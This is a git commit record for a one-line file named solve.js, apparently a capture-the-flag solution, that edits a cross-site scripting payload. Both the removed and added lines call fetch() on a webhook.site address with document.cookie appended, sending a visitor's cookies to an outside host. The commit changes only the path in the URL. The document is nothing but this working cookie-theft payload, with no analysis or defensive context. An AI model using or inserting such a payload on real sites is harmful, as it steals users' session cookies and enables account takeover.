31e2c7f44f5193f3fac92869539970cf80bc35d3
c0mrad3 <106001817+aedicious@users.noreply.github.com>
2025-01-04 19:30:37 +0300

    solve.js

--- solve.js
+++ solve.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/4dea91f9-3181-4bae-a70b-7744b639b4e0/admin.php?cookie="+document.cookie);
+fetch("https://webhook.site/4dea91f9-3181-4bae-a70b-7744b639b4e0?cookie="+document.cookie);
